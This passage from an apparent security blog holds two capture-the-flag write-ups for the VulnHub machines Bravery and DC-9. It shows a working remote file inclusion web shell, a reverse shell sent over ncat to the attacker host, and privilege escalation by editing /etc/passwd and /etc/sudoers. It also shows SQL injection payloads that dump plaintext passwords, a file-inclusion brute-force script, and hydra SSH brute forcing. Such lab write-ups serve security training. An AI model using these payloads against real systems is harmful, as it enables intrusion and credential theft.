http://192.168.179.129/genevieve            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 241] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/genevieve/]
http://192.168.179.129/Genevieve            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 265]                                         
http://192.168.179.129/Genevieve?           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 265]                                         
http://192.168.179.129/genevieve?           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 242] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/genevieve/?]

</code></pre></div></div>
<p><strong>Corporate web page</strong></p>

<p>Requesting the resource <strong>genevieve</strong>, I find another web page, I start browsing the site and in the tab <strong>Internal Use Only</strong> in the option <strong>Knowledge Management</strong> it redirects us at the Cuppa CMS.</p>

<p><img src="/assets/images/bravery/screenshot-4.png" alt="" /></p>

<p><img src="/assets/images/bravery/screenshot-5.png" alt="" /></p>

<p>Then we search in searchsploit for vulnerabilities in this CMS, and I find a possible Local/Remote File Inclusion vulnerability for Cuppa CMS.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit cuppa
<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                                            |  Path
<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Cuppa CMS - <span class="s1">'/alertConfigField.php'</span> Local/Remote File Inclusion                           | php/webapps/25971.txt
<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
</code></pre></div></div>
<p>I transfer a copy of this exploit to my current working directory, and see that it can be exploited for local and remote file inclusion.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/25971.txt
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>25971.txt
...
http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class="o">=</span>../../../../../../../../../etc/passwd
...
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
<p>I start the apache service and redirect a simple web shell to web root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>systemctl start apache2.service 
root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;?php passthru(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span> <span class="o">&gt;</span> /var/www/html/back.txt
</code></pre></div></div>
<p>Then I include the webshell that’s hosted on my local server and we execute the command <strong>id</strong>, as  shown below:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://192.168.179.1/back.txt&amp;cmd<span class="o">=</span><span class="nb">id</span>
</code></pre></div></div>
<p><img src="/assets/images/bravery/screenshot-6.png" alt="" /></p>

<p>We check if the tool <strong>ncat</strong> exists, in order to obtain an encrypted shell from the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://192.168.179.1/back.txt&amp;cmd<span class="o">=</span>which%20ncat
</code></pre></div></div>
<p><img src="/assets/images/bravery/screenshot-7.png" alt="" /></p>

<p><strong>Getting a reverse shell</strong></p>

<p>We start a listener with <strong>ncat</strong> on port 443.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 <span class="nt">--ssl</span>
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Generating a temporary 2048-bit RSA key. Use <span class="nt">--ssl-key</span> and <span class="nt">--ssl-cert</span> to use a permanent one.
Ncat: SHA-1 fingerprint: B8AD 2215 76EA E761 6B75 9B68 FB2A 48B2 7067 4C38
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
</code></pre></div></div>
<p>Then we execute with curl the following request that will establish a connection with the attacking machine and execute the linux bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.179.1/back.txt&amp;cmd=ncat%20192.168.179.1%20443%20-e%20/bin/bash%20--ssl"</span>
</code></pre></div></div>
<p>We got a shell with limited permissions and I used python to spawn a TTY shell, as shown below.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 <span class="nt">--ssl</span>
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Generating a temporary 2048-bit RSA key. Use <span class="nt">--ssl-key</span> and <span class="nt">--ssl-cert</span> to use a permanent one.
Ncat: SHA-1 fingerprint: B8AD 2215 76EA E761 6B75 9B68 FB2A 48B2 7067 4C38
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.179.129.
Ncat: Connection from 192.168.179.129:39134.
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
bash-4.2<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux bravery 3.10.0-862.3.2.el7.x86_64 <span class="c">#1 SMP Mon May 21 23:36:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>

</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-privileges">SUID Privileges</h3>
<p>Listing SUID permissions, I found the <strong>cat</strong> command which is potentially dangerous, wich we will take advantage of to escalate privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
...
</code></pre></div></div>
<p>Located in the directory <strong>temp</strong> redirect the content of <strong>/etc/passwd</strong> to a file in the current directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cd</span> /tmp
bash-4.2<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> passwd
</code></pre></div></div>
<p>On the attacking machine we generate a password hash with <strong>openssl</strong>, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>openssl passwd <span class="nt">-1</span> br4vR00t
<span class="nv">$1$um05ZRrH$2I3eWNoc</span>.MLsPEoEp1LCM.
</code></pre></div></div>

<p>Then we create the <strong>s4rgaz</strong> user and redirect to the <strong>passwd</strong> file in the current directory, we verify that the user was created, we copy the <strong>passwd</strong> file to <strong>/etc/passwd</strong>, we change to the <strong>s4rgaz</strong> user providing the password and we got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'s4rgasz$1$um05ZRrH$2I3eWNoc.MLsPEoEp1LCM.:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> passwd
bash-4.2<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-2</span> passwd
rick:x:1004:1004::/home/rick:/bin/bash
s4rgaz:<span class="nv">$1$um05ZRrH$2I3eWNoc</span>.MLsPEoEp1LCM.:0:0:root:/root:/bin/bash
bash-4.2<span class="nv">$ </span><span class="nb">cp </span>passwd /etc/passwd
bash-4.2<span class="nv">$ </span>su s4rgaz
Password: br4vR00t
<span class="o">[</span>root@bravery tmp]# <span class="nb">whoami
</span>root
<span class="o">[</span>root@bravery tmp]# <span class="nb">cat</span> ~/proof.txt
Congratulations on rooting BRAVERY. :<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - DC 9</h1>
	<p class="post-date text-bold text-upcase">
	<span>April 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Another vulnerable machine with the intent of gaining experience in the world of penetration testing.</p>

<p><strong>Author:</strong> DCAU7</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root and to read the one and only flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-dicovery">Host Dicovery</h3>
<p>We start by discovering the target host on the local network, for this we will use arp-scan as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24 
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.128 00:0c:29:0f:98:6d       VMware, Inc.
...
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Ones the target is discovered, we proceed to scan all TCP ports with nmap, to detect possible open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">-p1-65535</span> <span class="nt">-v</span> 192.168.179.128  
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-16 13:17 <span class="nt">-05</span>
...
Host is up <span class="o">(</span>0.0026s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 00:0C:29:0F:98:6D <span class="o">(</span>VMware<span class="o">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.83 seconds
</code></pre></div></div>
<p>In the output we can see that port 22 SSH is filtered, it is possible that certain firewall rules may be blocking incoming traffic, the only port that’s open is 80 HTTP.</p>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>For obtain more information on the open port, we do an aggressive scan, this scan enables operating system detection, version scanning, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-A</span> <span class="nt">-p80</span> <span class="nt">-v</span> 192.168.179.128
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-16 13:32 <span class="nt">-05</span>
...
PORT   STATE    SERVICE VERSION
80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:0F:98:6D <span class="o">(</span>VMware<span class="o">)</span>
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 42.715 days <span class="o">(</span>since Wed Apr 21 20:32:35 2021<span class="o">)</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.76 seconds
</code></pre></div></div>

<p>The result obtained indicates that port 80 is running Apache httpd 2.4.38, the possible operating system is debian and the supported methods.</p>

<h3 id="web-browser-enumeration">Web Browser Enumeration</h3>
<p>Browsing the web application in the <strong>Display All Records</strong> tab, users with personal information are listed, in the <strong>Search</strong> tab there’s a search box that retrieves users by name or surname, is possible that’is records are stored in a database and we try to test for SQL injection vulnerability, after several manual tests it could be detect that the web applicacion is vulnerable to SQL injection, as shown below:</p>

<p><img src="/assets/images/DC-9/screenshot-1.png" alt="" /></p>

<p>In the web application we can see that the all records are listed.</p>

<p><img src="/assets/images/DC-9/screenshot-2.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>
<p><strong>Column Number Enumeration</strong></p>

<p>Detected the vulnerability, I proceed to find the number of columns using the <strong>order by</strong> clause wich tries to sort the columns of the <strong>SELECT</strong> query, I started by sorting the first column and incrementing the value by one to the seventh column that does not produce any results, letting me to know that there’re six columns.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' order by 1 #
...
Mary'</span> order by 6 <span class="c">#</span>
</code></pre></div></div>

<p><strong>Understanding the layout of the output</strong></p>

<p>Our next step is know if the parameters are printable on the vulnerable web application, for this we use the following query:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select 1,2,3,4,5,6 #
</span></code></pre></div></div>
<p>In the output it can be seen that all the injected parameters are displayed on the screen.</p>

<p><img src="/assets/images/DC-9/screenshot-3.png" alt="" /></p>

<p><strong>Extracting data from the Database</strong></p>

<p>We started discovering the current database that’s using the web application, the current version of MySQL and the user being used for the database connection.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select database(),@@version,null,user(),null,null #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-4.png" alt="" /></p>

<p>After we enumerate the available databases with the following statement:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select schema_name,null,null,null,null,null from information_schema.schemata #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-5.png" alt="" /></p>

<p>We can see the <strong>Staff</strong> database that belongs to the web aplication and another one called <strong>users</strong>, at this moment we will try to list the names of the tables of the <strong>Staff</strong> schema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema=database() #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-6.png" alt="" /></p>

<p>In the output we see that there are two tables, let’s list the columns of the <strong>Users</strong> table which is the one that most catches our attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema=database() and table_name='</span>Users<span class="s1">' #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-7.png" alt="" /></p>

<p>At this point I’m going to intercept the request with burpsuite to later make the request with curl and filter the data with regular expressions, in this way I have the credentials stored in a file on my machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select concat(Username,0x3a,Password),null,null,null,null,null from Users #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-8.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/results.php"</span> <span class="nt">--data</span> <span class="s2">"search=Mary%27+and+1%3D2++union+select+concat%28Username%2C0x3a%2CPassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+Users+%23"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\w</span><span class="s2">*:</span><span class="se">\S</span><span class="s2">{32}"</span> <span class="o">&gt;</span> users_staff
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>users_staff
admin:856f5de590ef37314e7c3bdf6f8a66dc
</code></pre></div></div>

<p>In the result it can be seen that there’s only one record. Let’s try to crack this password hash in <a href="https://hashes.com">hashes.com</a>.</p>

<p><img src="/assets/images/DC-9/screenshot-9.png" alt="" /></p>

<p>As you can see, the password for this hash is <strong>transorbital1</strong></p>

<p><strong>users database</strong></p>

<p>Now let’s try to find out what interesting information may exist in the <strong>users</strong> schema, for this we start by listing the tables.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select table_name,null,null,null,null,null from information_schema.tables where table_schema='</span><span class="nb">users</span><span class="s1">' #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-10.png" alt="" /></p>

<p>We have found the table <strong>UserDetails</strong>, let’s list their respective columns.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select column_name,null,null,null,null,null from information_schema.columns where table_schema='</span><span class="nb">users</span><span class="s1">' and table_name='</span>UserDetails<span class="s1">' #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-11.png" alt="" /></p>

<p>In the output we see two important fields username and password, in the same way we intercept the request with burp and then create the request with curl and filter the data with regular expressions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mary<span class="s1">' and 1=2 union select concat(username,0x3a,password),null,null,null,null,null from users.UserDetails #
</span></code></pre></div></div>

<p><img src="/assets/images/DC-9/screenshot-12.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/results.php"</span> <span class="nt">--data</span> <span class="s2">"search=Mary%27++and+1%3D2+union+select+concat%28username%2C0x3a%2Cpassword%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+from+users.UserDetails+%23"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\w</span><span class="s2">*:</span><span class="se">\S</span><span class="s2">[^&lt;]*"</span> <span class="o">&gt;</span> UserDetails
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>UserDetails
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&amp;TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
</code></pre></div></div>

<p>It can be seen that a list of users with their respective passwords were obtained in plain text.</p>
<h3 id="local-file-inclusion">Local File Inclusion</h3>

<p>Later with the credentials <strong>admin:transorbital1</strong> we log in to the web application and we find a message at the bottom “File does not exist”.</p>

<p><img src="/assets/images/DC-9/screenshot-13.png" alt="" /></p>

<p>It is possible that a certain parameter is being called and requires include a specific file, but we do not know the parameter name, it is also possible that there’s a Local File Inclusion vulnerability, in that case I developed a python script to brute force with a list of common parameters and including the web server passwd file how value, this dictionary can be found in seclists.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>

import requests
from colorama import Fore,init

init<span class="o">()</span>
<span class="nv">green</span><span class="o">=</span>Fore.GREEN
<span class="nv">gray</span><span class="o">=</span>Fore.LIGHTBLACK_EX
<span class="nv">reset</span><span class="o">=</span>Fore.RESET

<span class="nv">s</span><span class="o">=</span>requests.session<span class="o">()</span>

def paramenum<span class="o">(</span>p<span class="o">)</span>:
    <span class="nv">values</span><span class="o">={</span>
            <span class="s1">'username'</span>:<span class="s1">'admin'</span>,
            <span class="s1">'password'</span>:<span class="s1">'transorbital1'</span>
            <span class="o">}</span>

    <span class="nv">req</span><span class="o">=</span>s.post<span class="o">(</span><span class="s2">"http://192.168.179.128/manage.php"</span>, <span class="nv">data</span><span class="o">=</span>values<span class="o">)</span>
    <span class="nv">req</span><span class="o">=</span>s.get<span class="o">(</span>f<span class="s2">"http://192.168.179.128/manage.php?{p}=../../../../../../etc/passwd"</span><span class="o">)</span>
    <span class="k">return </span>len<span class="o">(</span>req.text<span class="o">)</span>

<span class="nv">wordlist</span><span class="o">=</span>open<span class="o">(</span><span class="s2">"/opt/seclists/Discovery/Web-Content/burp-parameter-names.txt"</span><span class="o">)</span>.read<span class="o">()</span>.splitlines<span class="o">()</span>

<span class="k">if </span><span class="nv">__name__</span><span class="o">==</span><span class="s2">"__main__"</span>:
    <span class="k">for </span>parameter <span class="k">in </span>wordlist:
        <span class="nv">x</span><span class="o">=</span>paramenum<span class="o">(</span>parameter<span class="o">)</span>
        <span class="k">if </span>x <span class="o">!=</span> 1341:
            print<span class="o">(</span>f<span class="s2">"{green}{parameter:20}=&gt; {x}{reset}"</span><span class="o">)</span>
        <span class="k">else</span>:
            print<span class="o">(</span>f<span class="s2">"{gray}{parameter:20}=&gt; {x}{reset}"</span><span class="o">)</span>

</code></pre></div></div>

<p>A moment after running the script, it can be seen that in the <strong>file</strong> parameter the size of the server’s response is different.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 lfi.py
<span class="nb">id</span>                  <span class="o">=&gt;</span> 1341
...
file                <span class="o">=&gt;</span> 3694
...
code                <span class="o">=&gt;</span> 1341
</code></pre></div></div>

<p>I proceed to verify and you can see that the content of the passwd file is displayed on the web application, this means that exist a Local File Inclusion vulnerability.</p>

<p><img src="/assets/images/DC-9/screenshot-14.png" alt="" /></p>

<p>If we remember the port 22 is filtered, something is blocking the incoming traffic to that port, in certain cases a mechanism known as <strong>Port knocking</strong> is usually implemented as a security mechanism that allows open a port by attempting to connect to a series of ports closed. After googling I find that the configuration file is in <strong>/etc/knokd.conf</strong> and we try to see the content of this file, for this I have used curl as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.128/manage.php"</span> <span class="nt">-c</span> cookiefile <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=transorbital1"</span>
root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.128/manage.php?file=../../../../../../etc/knockd.conf"</span> <span class="nt">-b</span> cookiefile | <span class="nb">grep</span> <span class="nt">-vP</span> <span class="s1">'[&gt;]\B'</span> | <span class="nb">sed</span> <span class="s2">"s/^</span><span class="se">\s</span><span class="s2">.*[&gt;]//g; 1,9d"</span>
        UseSyslog

<span class="o">[</span>openSSH]
        sequence    <span class="o">=</span> 7469,8475,9842
        seq_timeout <span class="o">=</span> 25
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn

<span class="o">[</span>closeSSH]
        sequence    <span class="o">=</span> 9842,8475,7469
        seq_timeout <span class="o">=</span> 25
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-D</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn

</code></pre></div></div>

<p>In the output we see a sequence of ports that we have to connect to open port 22 and the same way there’s a secuence of ports to close it. I developed a bash oneliner that tries to connect to the ports <strong>7469 8475 9842</strong>, and we can verify that the SSH service is enabled.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>port <span class="k">in </span>7469 8475 9842<span class="p">;</span> <span class="k">do </span>nc 192.168.179.128 <span class="nv">$port</span><span class="p">;</span> <span class="k">done</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 7469 <span class="o">(</span>?<span class="o">)</span> : Connection refused
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 8475 <span class="o">(</span>?<span class="o">)</span> : Connection refused
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.128] 9842 <span class="o">(</span>?<span class="o">)</span> : Connection refused
root@kali:~<span class="nv">$ </span> nc 192.168.179.128 22
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</code></pre></div></div>

<h3 id="access-via-ssh">Access via SSH</h3>
<p>Then we try to verify if the credentials found allow us to have access via SSH, for this I used hydra.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-C</span> UserDetails ssh://192.168.179.128 
...
<span class="o">[</span>DATA] attacking ssh://192.168.179.128:22/
<span class="o">[</span>22][ssh] host: 192.168.179.128   login: chandlerb   password: UrAG0D!
<span class="o">[</span>22][ssh] host: 192.168.179.128   login: joeyt       password: Passw0rd
<span class="o">[</span>22][ssh] host: 192.168.179.128   login: janitor     password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
</code></pre></div></div>

<p>Three valid credentials were found, of which accessing as the user <strong>janitor</strong> I found the directory <strong>.secrets-for-putin</strong> with a file containing a list of passwords.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> janitor 192.168.179.128
janitor@192.168.179.128<span class="s1">'s password: 
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
</span></code></pre></div></div>

<p>This passwords are stored in the file <strong>ssh_passwords</strong> on the attacking machine, and we filter the usernames of the <strong>UserDetails</strong> file to store them in another file named <strong>ssh_users</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>ssh_passwords
BamBam01 
Passw0rd 
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
root@kali:~<span class="nv">$ </span><span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f</span> 1 UserDetails <span class="o">&gt;</span> ssh_users
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>ssh_users
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
</code></pre></div></div>

<p>Then I made a brute force attack with hydra, where two valid users were found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-L</span> ssh_users <span class="nt">-P</span> ssh_passwords ssh://192.168.179.128
...
<span class="o">[</span>DATA] attacking ssh://192.168.179.128:22/
<span class="o">[</span>22][ssh] host: 192.168.179.128   login: fredf   password: B4-Tru3-001
<span class="o">[</span>22][ssh] host: 192.168.179.128   login: joeyt   password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>We access via SSH with the credentials <strong>fredf:B4-Tru3-001</strong> we verify the sudo privileges and we found that it has permissions to execute a script without providing a password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> fredf 192.168.179.128                      
fredf@192.168.179.128<span class="s1">'s password: 
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
</span></code></pre></div></div>

<p>This script reads a file and adds the content to a file, to obtain root we create the <strong>sudo_perm</strong> file assigning sudo permissions to the user <strong>fredf</strong> to run any command without providing a password, then we execute the script as parameters the <strong>sudo_perm</strong> and <strong>sudoers</strong> files, and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/devstuff/dist/test/test 
Usage: python test.py <span class="nb">read </span>append
fredf@dc-9:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"fredf ALL=(ALL) NOPASSWD:ALL"</span> <span class="o">&gt;</span> sudo_perm
fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/devstuff/dist/test/test sudo_perm /etc/sudoers
fredf@dc-9:~<span class="nv">$ </span><span class="nb">sudo </span>su
root@dc-9:/home/fredf# <span class="nb">id
